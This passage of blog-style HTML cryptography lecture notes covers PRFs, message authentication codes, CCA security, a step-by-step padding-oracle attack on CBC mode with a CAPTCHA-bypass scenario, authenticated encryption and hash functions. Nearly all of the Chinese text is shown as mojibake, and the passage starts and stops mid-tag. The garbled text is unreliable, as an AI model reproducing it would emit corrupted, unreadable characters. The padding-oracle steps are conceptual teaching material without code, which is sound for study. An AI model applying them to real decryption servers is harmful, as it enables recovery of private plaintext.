id="3-5-1-ä¼ªéšæœºå‡½æ•°ï¼ˆPRFsï¼‰å’Œç½®æ¢"><a href="#3-5-1-ä¼ªéšæœºå‡½æ•°ï¼ˆPRFsï¼‰å’Œç½®æ¢" class="headerlink" title="3.5.1 ä¼ªéšæœºå‡½æ•°ï¼ˆPRFsï¼‰å’Œç½®æ¢"></a>3.5.1 ä¼ªéšæœºå‡½æ•°ï¼ˆPRFsï¼‰å’Œç½®æ¢</h3><p>PRFsï¼šä¼ªéšæœºå‡½æ•°æ˜¯ä¸€ç§â€œçœ‹èµ·æ¥éšæœºâ€çš„å‡½æ•°ã€‚ä¸ä¼ªéšæœºç”Ÿæˆå™¨ç±»ä¼¼ï¼Œä¼ªéšæœºå‡½æ•°çš„å®‰å…¨æ€§æ˜¯é€šè¿‡å…¶è¾“å‡ºä¸çœŸæ­£éšæœºå‡½æ•°çš„è¾“å‡ºéš¾ä»¥åŒºåˆ†æ¥å®šä¹‰çš„</p><ul><li><strong>ä¼ªéšæœºå‡½æ•°å’Œä¼ªéšæœºå‘ç”Ÿå™¨</strong><br><strong>ä»PRFæ„é€ PRG</strong>ï¼šå¯ä»¥é€šè¿‡åœ¨ä¸€ç³»åˆ—ä¸åŒè¾“å…¥ä¸Šè¯„ä¼°PRFæ¥æ„é€ PRGã€‚ä¾‹å¦‚ï¼Œå®šä¹‰$G(s) &#x3D; F_s(1) || F_s(2) || â€¦ || F_s(l)$ï¼Œå…¶ä¸­$l$æ˜¯æ‰€éœ€çš„è¾“å‡ºé•¿åº¦ã€‚<br><strong>ä»PRGæ„é€ PRF</strong>ï¼šå¯ä»¥å°†PRGçš„è¾“å‡ºè§£é‡Šä¸ºä¸€ä¸ªæŸ¥æ‰¾è¡¨ï¼Œä»è€Œæ„é€ ä¸€ä¸ªPRFã€‚ä½†è¿™ç§æ–¹æ³•ä»…é€‚ç”¨äºå°è¾“å…¥é•¿åº¦ã€‚</li></ul><blockquote><p>PRGè¦æ±‚è¾“å‡ºé•¿åº¦å¿…é¡»å¤§äºè¾“å…¥é•¿åº¦ï¼Œä½†PRFå…è®¸è¾“å‡ºé•¿åº¦ä¸è¾“å…¥æ— å…³</p></blockquote><h4 id="ä¼ªéšæœºç½®æ¢"><a href="#ä¼ªéšæœºç½®æ¢" class="headerlink" title="ä¼ªéšæœºç½®æ¢"></a>ä¼ªéšæœºç½®æ¢</h4><p><strong>å®šä¹‰ï¼š</strong> ä¼ªéšæœºç½®æ¢æ˜¯ä¸€ç§ç‰¹æ®Šçš„PRFï¼Œå…¶ä¸­è¾“å…¥å’Œè¾“å‡ºé•¿åº¦ç›¸åŒï¼Œå¹¶ä¸”å¯¹äºæ¯ä¸ªå¯†é’¥kï¼Œ$F_k$æ˜¯ä¸€ä¸ªåŒå°„ï¼ˆå³ç½®æ¢ï¼‰ã€‚</p><ul><li><strong>å¼ºä¼ªéšæœºç½®æ¢</strong><br><strong>å®šä¹‰ï¼š</strong> å¼ºä¼ªéšæœºç½®æ¢ä¸ä»…è¦æ±‚$F_k$ä¸å‡åŒ€éšæœºç½®æ¢ä¸å¯åŒºåˆ†ï¼Œè¿˜è¦æ±‚å³ä½¿åŒºåˆ†å™¨DåŒæ—¶è®¿é—®$F_k$å’Œå…¶é€†å‡½æ•°$F_k^{-1}$ï¼Œä¹Ÿæ— æ³•åŒºåˆ†ã€‚</li></ul><h3 id="3-5-2-åŸºäºä¼ªéšæœºå‡½æ•°çš„CPAå®‰å…¨"><a href="#3-5-2-åŸºäºä¼ªéšæœºå‡½æ•°çš„CPAå®‰å…¨" class="headerlink" title="3.5.2 åŸºäºä¼ªéšæœºå‡½æ•°çš„CPAå®‰å…¨"></a>3.5.2 åŸºäºä¼ªéšæœºå‡½æ•°çš„CPAå®‰å…¨</h3><p>éœ€è¦å¼•å…¥ä¸€ä¸ªéšæœºå˜é‡$r(å¦‚ä¸Šè¾¹æµå¯†ç éåŒæ­¥æ¨¡å¼ä¸­çš„IV)$</p><h1 id="4-æ¶ˆæ¯è®¤è¯ç ï¼ˆMACï¼‰"><a href="#4-æ¶ˆæ¯è®¤è¯ç ï¼ˆMACï¼‰" class="headerlink" title="4.æ¶ˆæ¯è®¤è¯ç ï¼ˆMACï¼‰"></a>4.æ¶ˆæ¯è®¤è¯ç ï¼ˆMACï¼‰</h1><p>ä¿è¯çœŸå®æ€§å’Œå®Œæ•´æ€§</p><h2 id="4-1-æ¶ˆæ¯å®Œæ•´æ€§"><a href="#4-1-æ¶ˆæ¯å®Œæ•´æ€§" class="headerlink" title="4.1 æ¶ˆæ¯å®Œæ•´æ€§"></a>4.1 æ¶ˆæ¯å®Œæ•´æ€§</h2><h3 id="4-1-1-å®‰å…¨æ€§vså®Œæ•´æ€§"><a href="#4-1-1-å®‰å…¨æ€§vså®Œæ•´æ€§" class="headerlink" title="4.1.1 å®‰å…¨æ€§vså®Œæ•´æ€§"></a>4.1.1 å®‰å…¨æ€§vså®Œæ•´æ€§</h3><p><strong>ä¿å¯†æ€§ä¸å®Œæ•´æ€§çš„åŒºåˆ«</strong></p><ul><li><strong>ä¿å¯†æ€§</strong>ï¼šé€šè¿‡åŠ å¯†æŠ€æœ¯é˜²æ­¢è¢«åŠ¨çªƒå¬è€…è·å–é€šä¿¡å†…å®¹ã€‚å…¶ç›®æ ‡æ˜¯ç¡®ä¿æ¶ˆæ¯çš„å†…å®¹ä¸è¢«æœªç»æˆæƒçš„äººçŸ¥æ™“ã€‚</li><li><strong>å®Œæ•´æ€§</strong>ï¼šç¡®ä¿æ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æœªè¢«ç¯¡æ”¹æˆ–ä¼ªé€ ã€‚è¿™ä¸ä»…æ¶‰åŠæ¶ˆæ¯å†…å®¹çš„æ­£ç¡®æ€§ï¼Œè¿˜æ¶‰åŠæ¶ˆæ¯æ¥æºçš„çœŸå®æ€§</li></ul><h3 id="4-1-2-åŠ å¯†ä¸æ¶ˆæ¯è®¤è¯"><a href="#4-1-2-åŠ å¯†ä¸æ¶ˆæ¯è®¤è¯" class="headerlink" title="4.1.2 åŠ å¯†ä¸æ¶ˆæ¯è®¤è¯"></a>4.1.2 åŠ å¯†ä¸æ¶ˆæ¯è®¤è¯</h3><p> <strong>åŠ å¯†ä¸æ¶ˆæ¯è®¤è¯çš„åŒºåˆ«</strong> </p><ul><li><strong>åŠ å¯†</strong>ï¼šç”¨äºå®ç°ä¿å¯†æ€§ï¼Œå³é˜²æ­¢æœªç»æˆæƒçš„ç¬¬ä¸‰æ–¹è·å–æ¶ˆæ¯å†…å®¹ã€‚   </li><li><strong>æ¶ˆæ¯è®¤è¯</strong>ï¼šç”¨äºä¿è¯æ¶ˆæ¯çš„å®Œæ•´æ€§å’Œæ¥æºçš„çœŸå®æ€§ï¼Œç¡®ä¿æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ä¸”ç¡®å®æ¥è‡ªå£°ç§°çš„å‘é€è€…ã€‚</li></ul><p><strong>å¸¸è§è¯¯åŒº</strong>ï¼šè®¸å¤šäººé”™è¯¯åœ°è®¤ä¸ºåŠ å¯†å¯ä»¥è‡ªåŠ¨æä¾›æ¶ˆæ¯è®¤è¯ï¼Œä½†å®é™…ä¸ŠåŠ å¯†å¹¶ä¸ä¿è¯æ¶ˆæ¯çš„å®Œæ•´æ€§ï¼Œé™¤éå®ƒè¢«ä¸“é—¨è®¾è®¡ä¸ºå…·æœ‰æ­¤åŠŸèƒ½ã€‚</p><ul><li><p><strong>ä½¿ç”¨æµå¯†ç åŠ å¯†</strong><br><strong>æµå¯†ç åŠ å¯†æœºåˆ¶</strong>ï¼šä½¿ç”¨å…±äº«å¯†é’¥ç”Ÿæˆä¼ªéšæœºåºåˆ—ï¼ˆpadï¼‰ï¼Œç„¶åé€šè¿‡ä¸æ˜æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®—ç”Ÿæˆå¯†æ–‡ã€‚<br><strong>æ¼æ´åˆ†æ</strong>ï¼šæµå¯†ç åŠ å¯†çš„å¯†æ–‡å¾ˆå®¹æ˜“è¢«ç¯¡æ”¹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç¿»è½¬å¯†æ–‡ä¸­çš„ä»»æ„ä¸€ä½æ¥ç¿»è½¬è§£å¯†åæ˜æ–‡ä¸­çš„å¯¹åº”ä½ã€‚ä¾‹å¦‚ï¼š<br>å¦‚æœç”¨æˆ·åŠ å¯†äº†ä¸€ä¸ªè¡¨ç¤ºè½¬è´¦é‡‘é¢çš„æ•°å­—ï¼ˆå¦‚1000ç¾å…ƒï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç¿»è½¬æœ€ä½ä½æ¥æ”¹å˜é‡‘é¢ä¸º1001ç¾å…ƒï¼Œæˆ–è€…é€šè¿‡ç¿»è½¬ç¬¬11ä½æ¥å¢åŠ è¶…è¿‡1000ç¾å…ƒã€‚<br>å³ä½¿æ”»å‡»è€…ä¸çŸ¥é“å…·ä½“çš„é‡‘é¢ï¼Œä½†å¦‚æœæœ‰éƒ¨åˆ†å…ˆéªŒçŸ¥è¯†ï¼ˆå¦‚é‡‘é¢å°äº1000ç¾å…ƒï¼‰ï¼Œä»–ä»¬å¯ä»¥é¢„æµ‹ä¿®æ”¹çš„æ•ˆæœã€‚<br><strong>ç»“è®º</strong>ï¼šè¿™ç§æ”»å‡»å¹¶ä¸è¿ååŠ å¯†çš„ä¿å¯†æ€§ï¼Œä½†å®ƒä¸¥é‡ç ´åäº†æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p></li><li><p><strong>ä½¿ç”¨åˆ†ç»„å¯†ç åŠ å¯†</strong><br><strong>åˆ†ç»„å¯†ç åŠ å¯†æœºåˆ¶</strong>ï¼šä½¿ç”¨åˆ†ç»„å¯†ç ï¼ˆå¦‚AESï¼‰å¯¹æ•°æ®å—è¿›è¡ŒåŠ å¯†ã€‚<br><strong>æ¼æ´åˆ†æ</strong>ï¼š<br><strong>ECBæ¨¡å¼</strong>ï¼šç¿»è½¬å¯†æ–‡ä¸­æŸä¸ªæ•°æ®å—çš„æŸä¸€ä½åªä¼šæ”¹å˜è§£å¯†åè¯¥æ•°æ®å—çš„å¯¹åº”ä½ï¼Œå…¶ä»–æ•°æ®å—ä¿æŒä¸å˜ã€‚è™½ç„¶å¯¹å•ä¸ªæ•°æ®å—çš„å½±å“å¯èƒ½éš¾ä»¥é¢„æµ‹ï¼Œä½†è¿™ç§å±€éƒ¨ç¯¡æ”¹å¯èƒ½å·²ç»è¶³å¤Ÿé€ æˆæŸå®³ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é‡æ–°æ’åˆ—å¯†æ–‡å—æ¥é‡æ–°æ’åˆ—æ˜æ–‡å—ï¼Œæˆ–è€…é€šè¿‡ä¸¢å¼ƒå¯†æ–‡å—æ¥æˆªæ–­æ¶ˆæ¯ã€‚<br><strong>CBCæ¨¡å¼</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ç¿»è½¬$IV$çš„æŸä¸€ä½æ¥æ”¹å˜ç¬¬ä¸€ä¸ªæ˜æ–‡å—çš„å¯¹åº”ä½ï¼Œè€Œå…¶ä»–æ˜æ–‡å—ä¿æŒä¸å˜ã€‚<br><strong>ç»“è®º</strong>ï¼šå³ä½¿ä½¿ç”¨æ›´å¤æ‚çš„åˆ†ç»„å¯†ç åŠ å¯†æ¨¡å¼ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥é€šè¿‡å¯¹å¯†æ–‡è¿›è¡Œå±€éƒ¨ä¿®æ”¹æ¥å®ç°å¯¹æ˜æ–‡çš„ç¯¡æ”¹ã€‚</p></li></ul><h2 id="4-2-MACå®šä¹‰"><a href="#4-2-MACå®šä¹‰" class="headerlink" title="4.2 MACå®šä¹‰"></a>4.2 MACå®šä¹‰</h2><p>MACçš„ç›®çš„æ˜¯é˜²æ­¢å¯¹æ‰‹ä¿®æ”¹ä¸€æ–¹å‘é€ç»™å¦ä¸€æ–¹çš„æ¶ˆæ¯ï¼Œæˆ–æ³¨å…¥æ–°æ¶ˆæ¯ï¼Œè€Œæ¥æ”¶æ–¹æ— æ³•å¯Ÿè§‰æ¶ˆæ¯å¹¶éæ¥è‡ªé¢„æœŸçš„å‘é€æ–¹</p><p><strong>MACçš„ä¸¤ä¸ªå…¸å‹åº”ç”¨åœºæ™¯</strong></p><ul><li>ç¡®ä¿ä¸¤æ–¹é€šä¿¡æ—¶çš„å®Œæ•´æ€§ï¼ˆå¦‚ç”¨æˆ·ä¸é“¶è¡Œä¹‹é—´çš„é€šä¿¡ï¼‰</li><li>æˆ–ä¸€ä¸ªç”¨æˆ·éšæ—¶é—´â€œä¸è‡ªå·±â€é€šä¿¡ï¼ˆå¦‚æ¶‰åŠç½‘ç»œCookieçš„æƒ…å†µï¼Œæˆ–ç”¨æˆ·ä¿æŠ¤å…¶ç¡¬ç›˜å†…å®¹çš„æƒ…å†µï¼‰</li></ul><h4 id="æ¶ˆæ¯è®¤è¯ç çš„è¯­æ³•"><a href="#æ¶ˆæ¯è®¤è¯ç çš„è¯­æ³•" class="headerlink" title="æ¶ˆæ¯è®¤è¯ç çš„è¯­æ³•"></a>æ¶ˆæ¯è®¤è¯ç çš„è¯­æ³•</h4><p><strong>å¯†é’¥ç”Ÿæˆç®—æ³• Gen</strong>ï¼šè¾“å…¥å®‰å…¨å‚æ•°$1^n$ï¼Œè¾“å‡ºå¯†é’¥ kï¼Œä¸”$âˆ£kâˆ£â‰¥n$ã€‚<br><strong>æ ‡ç­¾ç”Ÿæˆç®—æ³• Mac</strong>ï¼šè¾“å…¥å¯†é’¥ k å’Œæ¶ˆæ¯ mï¼Œè¾“å‡ºæ ‡ç­¾ tã€‚<br><strong>éªŒè¯ç®—æ³• Vrfy</strong>ï¼šè¾“å…¥å¯†é’¥ kã€æ¶ˆæ¯ m å’Œæ ‡ç­¾ tï¼Œè¾“å‡ºéªŒè¯ç»“æœï¼ˆ1 è¡¨ç¤ºæœ‰æ•ˆï¼Œ0 è¡¨ç¤ºæ— æ•ˆï¼‰ã€‚</p><p><strong>è¦æ±‚</strong>ï¼šå¯¹äºæ‰€æœ‰å¯†é’¥ k å’Œæ¶ˆæ¯ mï¼Œå¿…é¡»æ»¡è¶³$Vrfy_kâ€‹(m,Mackâ€‹(m))&#x3D;1$ã€‚</p><ul><li><strong>è§„èŒƒéªŒè¯</strong><br>å¯¹äºç¡®å®šæ€§çš„MACï¼Œè¿›è¡ŒéªŒè¯çš„è§„èŒƒæ–¹æ³•ï¼š<br>é‡æ–°è®¡ç®—æ ‡ç­¾å¹¶æ£€æŸ¥å…¶æ˜¯å¦ç›¸ç­‰ã€‚æ¢å¥è¯è¯´ï¼Œ$Vrfy_kï¼ˆmï¼Œtï¼‰$é¦–å…ˆè®¡ç®—$\bar tï¼š&#x3D;Mack(m)$ï¼Œç„¶åè¾“å‡º1å½“ä¸”ä»…å½“$\tilde t&#x3D;t$ã€‚</li></ul><h4 id="MACå®‰å…¨"><a href="#MACå®‰å…¨" class="headerlink" title="MACå®‰å…¨"></a>MACå®‰å…¨</h4><p><strong>ä¸¤ä¸ªå®šä¹‰å‡è®¾ï¼š</strong></p><ol><li>æ”»å‡»è€…å¯ä»¥åå¤è¯·æ±‚å…¶é€‰æ‹©çš„ä»»ä½•æ¶ˆæ¯çš„æ ‡ç­¾ã€‚</li><li>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¸ºä»»ä½•ä¹‹å‰æœªè®¤è¯çš„æ¶ˆæ¯ç”Ÿæˆæœ‰æ•ˆæ ‡ç­¾ï¼Œåˆ™è®¤ä¸ºæ–¹æ¡ˆè¢«ç ´è§£ã€‚</li></ol><p>å¦‚æœæ— æ³•è¢«ä¸Šè¿°æ–¹å¼ç ´è§£ï¼Œé‚£ä¹ˆMACè¢«ç§°ä¸ºåœ¨è‡ªé€‚åº”é€‰æ‹©æ¶ˆæ¯æ”»å‡»ä¸‹å­˜åœ¨æ€§ä¸å¯ä¼ªé€ çš„ã€‚</p><ul><li><p><strong>å®šä¹‰æ˜¯å¦è¿‡äºä¸¥æ ¼ï¼Ÿ</strong><br>æœ‰äººæè®®è¯´å®šä¹‰å®‰å…¨æ€§æ—¶åªå…³æ³¨<strong>æœ‰æ•ˆæ¶ˆæ¯</strong>å°±å¯ä»¥ï¼Œä½†åœ¨å®é™…ä¸­ï¼Œæ˜¯å¦æœ‰æ•ˆå–å†³äºå…·ä½“æƒ…å†µï¼Œåªæœ‰ä¸¥æ ¼çš„å®šä¹‰æ‰èƒ½é€‚åº”æ›´å¹¿æ³›çš„æƒ…å†µã€‚</p></li><li><p><strong>é‡æ’­æ”»å‡»</strong><br>æ”»å‡»è€…ç®€å•åœ°é‡æ–°å‘é€ä¹‹å‰å·²è®¤è¯çš„æ¶ˆæ¯åŠå…¶æœ‰æ•ˆæ ‡ç­¾ã€‚MACæœ¬èº«æ— æ³•é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œå› ä¸ºéªŒè¯è¿‡ç¨‹æ˜¯æ— çŠ¶æ€çš„ï¼ˆå³æ¯æ¬¡å‘ˆç°æœ‰æ•ˆçš„æ¶ˆæ¯å’Œæ ‡ç­¾å¯¹æ—¶ï¼ŒéªŒè¯ç®—æ³•æ€»æ˜¯è¾“å‡º1ï¼‰ã€‚<br>é˜²æ­¢æ–¹æ³•ï¼šåºåˆ—å·ã€æ—¶é—´æˆ³</p></li><li><p><strong>å¼ºä¸å¯ä¼ªé€ æ€§</strong><br>è¦æ±‚æ”»å‡»è€…æ— æ³•ä¸ºä»»ä½•æ¶ˆæ¯ç”Ÿæˆæ–°çš„æœ‰æ•ˆæ ‡ç­¾ï¼Œå³ä½¿è¯¥æ¶ˆæ¯ä¹‹å‰å·²è¢«è®¤è¯è¿‡ã€‚</p></li><li><p><strong>éªŒè¯æŸ¥è¯¢</strong><br>è¿™äº›å®šä¹‰ä¸­çš„æ”»å‡»è€…è¢«èµ‹äºˆå¯¹MACé¢„è¨€æœºçš„è®¿é—®æƒé™ï¼Œè¿™å¯¹åº”äºç°å®ä¸–ç•Œä¸­èƒ½å¤Ÿå½±å“è¯šå®å‘é€æ–¹ä¸ºæŸäº›æ¶ˆæ¯ç”Ÿæˆæ ‡ç­¾çš„æ”»å‡»è€…ã€‚</p></li><li><p><strong>æ½œåœ¨çš„å®šæ—¶æ”»å‡»</strong><br>ä¸€ç§æµ‹ä¿¡é“æ”»å‡»ï¼šå®ƒéœ€è¦è®¿é—®éªŒè¯é¢„è¨€æœºä»¥åŠæµ‹é‡æ¯”è¾ƒiå’Œi+ 1å­—èŠ‚æ‰€éœ€æ—¶é—´å·®å¼‚çš„èƒ½åŠ›ã€‚</p></li></ul><h1 id="5-é€‰æ‹©å¯†æ–‡æ”»å‡»-CCA-å®‰å…¨å’Œè®¤è¯åŠ å¯†"><a href="#5-é€‰æ‹©å¯†æ–‡æ”»å‡»-CCA-å®‰å…¨å’Œè®¤è¯åŠ å¯†" class="headerlink" title="5.é€‰æ‹©å¯†æ–‡æ”»å‡»(CCA)å®‰å…¨å’Œè®¤è¯åŠ å¯†"></a>5.é€‰æ‹©å¯†æ–‡æ”»å‡»(CCA)å®‰å…¨å’Œè®¤è¯åŠ å¯†</h1><p><strong>æ¦‚å¿µ</strong>ï¼šæ”»å‡»è€…é€‰æ‹©å¯†æ–‡è®©æ¥æ”¶è€…è§£å¯†ã€‚<br><strong>ç®€å•ä¸¾ä¾‹</strong>ï¼šæˆ˜äº‰ä¸­ï¼Œç¾å†›æ›¾å‘æ—¥å†›é€éœ²åŒ…å«AFçš„åŠ å¯†ä¿¡æ¯ï¼Œé€šè¿‡æ—¥å†›çš„ååº”ï¼Œå¯ä»¥çŒœæµ‹AFæ‰€ä»£è¡¨çš„æ˜æ–‡æ˜¯ä»€ä¹ˆã€‚</p><p>æ”»å‡»å¸¸å‘ç”Ÿåœ¨WebæœåŠ¡å™¨ä¸Šï¼Œç”¨æ¥è·å–TLSä¼šè¯å†…å®¹</p><h2 id="5-2Padding-Oracle-Attacksï¼ˆå¡«å……æç¤ºæ”»å‡»ï¼‰"><a href="#5-2Padding-Oracle-Attacksï¼ˆå¡«å……æç¤ºæ”»å‡»ï¼‰" class="headerlink" title="5.2Padding-Oracle Attacksï¼ˆå¡«å……æç¤ºæ”»å‡»ï¼‰"></a>5.2Padding-Oracle Attacksï¼ˆå¡«å……æç¤ºæ”»å‡»ï¼‰</h2><ul><li><strong>å¸¸ç”¨å¡«å……æ–¹å¼PKCS #7</strong>:<br>è®¾åˆ†ç»„å¯†ç çš„åˆ†ç»„é•¿åº¦ä¸ºLï¼Œè‹¥å¯†æ–‡å·®bä¸ªå­—èŠ‚è¾¾åˆ°Lçš„æ•´æ•°å€ï¼Œé‚£ä¹ˆä¾¿å¡«å……bä¸ªå€¼ä¸ºbçš„åå…­è¿›åˆ¶æ•°<br>å¦‚ï¼šå·®4ä¸ªå­—èŠ‚å°±å¡«å……0x04040404<br>å¦‚æœbç­‰äº0ï¼Œé‚£ä¹ˆä¾¿ä»¤bä¸ºLï¼Œå³$b\in [1,L]$<br><strong>éªŒè¯æ–¹æ³•ï¼š</strong> å…ˆè¯»å–æœ€åä¸€ä¸ªå­—èŠ‚çš„å€¼bï¼Œå†åˆ¤æ–­æœ€åbä¸ªå€¼æ˜¯å¦éƒ½ä¸ºbã€‚</li></ul><h3 id="æ”»å‡»æ–¹æ³•ï¼š-CBCæ¨¡å¼"><a href="#æ”»å‡»æ–¹æ³•ï¼š-CBCæ¨¡å¼" class="headerlink" title="æ”»å‡»æ–¹æ³•ï¼š(CBCæ¨¡å¼)"></a><strong>æ”»å‡»æ–¹æ³•ï¼š(CBCæ¨¡å¼)</strong></h3><p>å·²çŸ¥ï¼š$IV,c_1,c_2$<br><strong>1.æ±‚bï¼š</strong><br>å…ˆä¿®æ”¹æœ€åä¸€ä¸ªå—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå¦‚æœæŠ¥é”™ï¼Œè¯´æ˜b&#x3D;L,ï¼Œå¦åˆ™b&lt;Lï¼Œæ¥ç€ä¿®æ”¹ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œé‡å¤æ­¤è¿‡ç¨‹ä¾¿èƒ½æ±‚å‡ºbã€‚<br><strong>2.æ±‚é™¤å¡«å……å¤–çš„æœ€åä¸€ä¸ªæ˜æ–‡å­—èŠ‚ï¼š</strong> </p><ul><li>è®¾$i\in[0,2^8),$å–ä¸€ä¸ª<br>$\Delta i$<br>$&#x3D;0x00,â€¦,0x00,0xi, 0x(b+1),â€¦,0x(b+1)$<br>$\oplus,0x00,â€¦,0x00,0x00,0xb,â€¦,0xb$<blockquote><p>ps:$0xi$åè·Ÿçš„æ˜¯bä¸ª0xb+1</p></blockquote></li><li>å–$c_1â€™&#x3D;c_1\oplus \Delta i$ï¼Œå°†$IV,c_1â€™,c_2$é€ç»™è§£å¯†æœåŠ¡å™¨</li><li>éå†$i$ï¼ŒçŸ¥é“æœåŠ¡å™¨è¿”å›è§£å¯†æˆåŠŸï¼Œæ­¤æ—¶çš„$m_2$æ˜æ–‡å½¢å¼ä¸ºï¼š<br>$m_2&#x3D;â€¦;0x(b+1);0x(b+1);â€¦;0x(b+1)$ï¼Œå…±$b+1$ä¸ª$0x(b+1)$</li><li>è®¾æœ€åä¸€ä¸ªæ˜æ–‡éå¡«å……å­—èŠ‚ä¸ºMï¼Œåˆ™æœ‰$0x(b+1)&#x3D;M\oplus i$</li><li>å¾—åˆ°$M&#x3D;i\oplus 0x(b+1)$</li><li>ä»¥æ­¤ç±»æ¨ä¾¿å¯ä»¥æ±‚å‡ºæ‰€æœ‰æ˜æ–‡å­—èŠ‚ï¼Œæ®æˆ‘ç†è§£ï¼Œæ±‚$m_1$æ—¶å¯ä»¥å»æ‰$c_2$ï¼Œå°†bæœ€å¼€å§‹å½“ä½œ0ï¼Œå°†$c_1,IV$å‘é€ç»™è§£å¯†æœåŠ¡å™¨ã€‚</li></ul><h3 id="éªŒè¯ç æ”»å‡»"><a href="#éªŒè¯ç æ”»å‡»" class="headerlink" title="éªŒè¯ç æ”»å‡»"></a>éªŒè¯ç æ”»å‡»</h3><ul><li>WebæœåŠ¡å™¨$S_w$ï¼ˆç”Ÿæˆå¯†æ–‡ï¼‰ï¼ŒéªŒè¯ç æœåŠ¡å™¨$S_c$ï¼ˆç”ŸæˆéªŒè¯ç ï¼‰ï¼Œä¸¤æœåŠ¡å™¨å…±äº«å¯†é’¥ï¼Œç”¨æˆ·$u$<br><strong>æ­£å¸¸è¿‡ç¨‹ï¼š</strong> $S_w$ç”Ÿæˆå¯†æ–‡å‘é€ç»™ç”¨æˆ·$uï¼Œu$å°†å…¶å‘é€ç»™$S_c$ï¼Œ$S_c$ä¼šå¯¹å¡«å……é”™è¯¯çš„å¯†æ–‡è¿”å›é”™è¯¯ï¼Œè®©$S_c$ç”Ÿæˆæ‰­æ›²çš„éªŒè¯ç è¿”å›$uï¼Œu$é€šè¿‡æŸ¥çœ‹éªŒè¯ç å¾—åˆ°æ˜æ–‡$m$ï¼Œå‘é€ç»™$Sw$ï¼ŒéªŒè¯é€šè¿‡<br><strong>æ”»å‡»è¿‡ç¨‹ï¼š</strong> $S_w$è¡Œä¸ºä¸å˜ï¼Œ$u$ä½¿ç”¨Padding Oracle Attackså»æ”»å‡»$S_c$ï¼Œæœ€åå¾—åˆ°æ˜æ–‡$m$ï¼Œæ­¤æ—¶è‡ªåŠ¨è„šæœ¬ä¹Ÿèƒ½å®ŒæˆäººæœºéªŒè¯ã€‚</li></ul><h3 id="CCAå®‰å…¨æ€§å®šä¹‰"><a href="#CCAå®‰å…¨æ€§å®šä¹‰" class="headerlink" title="CCAå®‰å…¨æ€§å®šä¹‰"></a>CCAå®‰å…¨æ€§å®šä¹‰</h3><p><strong>å¨èƒæ¨¡å‹ï¼š</strong></p><ul><li>æ‹¥æœ‰åŠ å¯†é¢„è¨€æœºï¼ˆé»‘ç›’ï¼Œå¯†é’¥éšæœºï¼‰ï¼Œè§£å¯†é¢„è¨€æœºï¼Œä½†å¯¹ç»™å®šå¯†æ–‡æ²¡æœ‰è§£å¯†æƒé™ã€‚ï¼ˆä¸€èˆ¬æ˜¯æœ€åå‡è®¾ï¼‰<br><strong>å®‰å…¨ç›®æ ‡ï¼š</strong></li><li>ç»™å®šæ”»å‡»è€…ä¸€ä¸ªå¯†æ–‡$c$ï¼Œè‹¥ä»–èƒ½ä»¥æ˜¾è‘—å¤§äº$\frac12$çš„æ¦‚ç‡åˆ¤æ–­æ˜¯$m_0,m_1$ä¸­çš„å“ªä¸ªçš„åŠ å¯†ç»“æœï¼Œåˆ™æ–¹æ¡ˆä¸å®‰å…¨ã€‚</li></ul><h2 id="5-2è®¤è¯åŠ å¯†ï¼ˆAEï¼‰"><a href="#5-2è®¤è¯åŠ å¯†ï¼ˆAEï¼‰" class="headerlink" title="5.2è®¤è¯åŠ å¯†ï¼ˆAEï¼‰"></a>5.2è®¤è¯åŠ å¯†ï¼ˆAEï¼‰</h2><p><strong>ç›®æ ‡ï¼š</strong> ä¿å¯†æ€§ï¼Œå®Œæ•´æ€§<br>ä¿å¯†æ€§ï¼šCCAå®‰å…¨<br>å®Œæ•´æ€§ï¼šä¸å¯ä¼ªé€ æ€§<br><strong>å®šä¹‰</strong>ï¼šå¦‚æœä¸€ä¸ªç§é’¥åŠ å¯†æ–¹æ¡ˆæ—¢æ˜¯CCAå®‰å…¨çš„ï¼Œåˆæ˜¯ä¸å¯ä¼ªé€ çš„ï¼Œåˆ™å®ƒæ˜¯ä¸€ä¸ªè®¤è¯åŠ å¯†ï¼ˆAEï¼‰æ–¹æ¡ˆã€‚</p><h1 id="6-å“ˆå¸Œå‡½æ•°å’Œåº”ç”¨"><a href="#6-å“ˆå¸Œå‡½æ•°å’Œåº”ç”¨" class="headerlink" title="6.å“ˆå¸Œå‡½æ•°å’Œåº”ç”¨"></a>6.å“ˆå¸Œå‡½æ•°å’Œåº”ç”¨</h1><p><strong>æ¦‚å¿µï¼š</strong> ä¸€ç§å°†é•¿è¾“å…¥å­—ç¬¦ä¸²æ˜ å°„åˆ°çŸ­è¾“å‡ºå­—ç¬¦ä¸²ï¼ˆæ‘˜è¦ï¼‰çš„å‡½æ•°ã€‚<br><strong>ç¢°æ’ï¼š</strong> ä¸¤ä¸ªä¸åŒè¾“å…¥äº§ç”Ÿç›¸åŒæ‘˜è¦ã€‚<br><strong>æŠ—ç¢°æ’æ€§ï¼š</strong> ä»»ä½•æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´ç®—æ³•éƒ½éš¾ä»¥æ‰¾åˆ°Hä¸­çš„ç¢°æ’ã€‚<br><strong>å¸¦å¯†é’¥çš„hashå‡½æ•°ï¼š</strong> æ­¤æ—¶å‡½æ•°Hæœ‰ä¸¤ä¸ªè¾“å…¥ï¼Œ$key:s,string:x$ï¼Œè¾“å‡ºä¸º$H^s&#x3D;H(s,x)$ã€‚å…¶ä¸­$s$åœ¨ä¸Šæ 